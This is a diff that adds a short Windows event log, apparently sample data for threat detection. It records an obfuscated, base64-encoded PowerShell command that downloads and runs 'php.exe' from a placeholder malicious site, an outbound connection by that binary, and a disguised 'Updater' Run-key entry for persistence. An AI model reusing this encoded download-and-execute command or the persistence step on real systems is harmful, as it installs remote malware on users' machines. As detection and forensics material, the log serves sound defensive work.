@@ -1,0 +1,17 @@
+Event ID: 4688
+Time: 2026-02-14 14:22:31
+New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Creator Process Name: C:\Windows\explorer.exe
+Command Line: powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHMAaQB0AGUALgBjAG8AbQAvAHAAaABwAC4AZQB4AGUAIgApAA==
+
+Event ID: 5156
+Time: 2026-02-14 14:22:33
+Application: php.exe
+Destination Address: 185.234.219.12
+Destination Port: 80
+
+Event ID: 4657
+Time: 2026-02-14 14:23:01
+Registry Key Modified:
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+Value Name: Updater
